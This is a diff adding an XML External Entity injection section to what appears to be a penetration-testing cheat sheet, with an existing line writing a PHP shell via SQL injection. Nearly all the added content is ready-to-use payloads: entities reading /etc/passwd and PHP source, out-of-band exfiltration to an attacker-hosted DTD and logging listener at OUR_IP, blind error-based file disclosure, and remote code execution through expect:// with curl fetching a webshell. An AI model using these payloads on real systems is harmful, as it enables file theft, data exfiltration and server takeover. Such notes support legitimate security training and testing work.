@@ -198,3 +198,144 @@ Write PHP Shell to file
 ```sql
 cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
 ```
+
+## 5) XML External Entity (XXE) Injeciton
+### Basic Explanation:
+Imagine a web app accepts xml user input and reflects the user's email to the page as such
+```xml
+<? xml version="1.0" encoding="UTF-8"?>
+	<root>
+		<name>
+			First
+		</name>
+		<tel>
+		</tel>
+		<email>
+			test@xxe.com
+		</email>
+		<message>
+			Test
+		</message>
+	</root>
+```
+Response:
+```txt
+Check your email test@xxe.com for further instructions
+```
+
+We can insert a malicious xxe payload to read files:
+```xml
+<? xml version="1.0" encoding="UTF-8"?>
+	<! DOCTYPE email [
+	<! ENTITY company SYSTEM "file:///etc/passwd">
+	]>
+	<root>
+		<name>
+			First
+		</name>
+		<tel>
+		</tel>
+		<email>
+			&company;
+		</email>
+		<message>
+			Test
+		</message>
+	</root>
+```
+Response:
+```txt
+Check your email root:x:0:0:root:/root:/bin/bash ... for further instructions
+```
+
+If there are issues with not seeing content, likely due to XML special chars escaping the xml. This can be solved using `php://filter/` with `convert.base64-encode`:
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=target-file.php">
+]>
+```
+
+You can also try wrapping it in CDATA if you expect special characters:
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email>
+```
+
+### Blind XXE
+If the server does not output any fields we have control over we can check for errors. If errors are outputed, we can host a `.dtd` file to display the output of other files on error:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+```bash
+python3 -m http.server 8000
+```
+
+And then submit the following payload:
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+When Fully Blind:
+`xxe.dtd`:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+`index.php`:
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+Start PHP:
+```bash
+php -S 0.0.0.0:8000
+```
+Payload to send:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+### RCE with XXE
+RCE with XXE can be possible using `expect://<command>`. We can generate a  webshell:
+```bash
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+```
+And then attempt to use curl to download the webshell to the server, using `$IFS` to handle whitespace.
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
